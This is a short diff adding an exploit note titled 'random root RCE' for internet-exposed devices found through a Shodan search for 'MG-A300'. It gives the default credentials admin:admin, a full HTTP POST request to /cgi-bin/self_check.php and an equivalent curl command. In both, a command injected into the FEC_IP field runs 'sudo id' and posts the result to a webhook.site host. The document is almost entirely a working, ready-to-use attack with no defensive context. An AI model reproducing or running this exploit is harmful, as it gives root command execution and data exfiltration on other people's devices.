@@ -1,0 +1,26 @@
+random root RCE on japan stuff by 
+
+shodan title:MG-A300
+
+default cred admin:admin
+
+
+POST /cgi-bin/self_check.php HTTP/1.1
+Host: xx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+Origin: http://xx
+Authorization: Basic YWRtaW46YWRtaW4=
+Connection: close
+Referer: http://xx/cgi-bin/self_check.php
+Upgrade-Insecure-Requests: 1
+
+FEC_IP=$(wget%20--post-data%20"$(sudo%20id)"%20http://webhook.site/xx/)&WIFI_IP=test&proc_step=1
+
+
+
+curl -X POST http://xx:xx/cgi-bin/self_check.php -d 'FEC_IP=$(wget%20--post-data%20"$(sudo%20id)"%20http://webhook.site/xx/)&WIFI_IP=test&proc_step=1' -H 'Authorization: Basic YWRtaW46YWRtaW4=
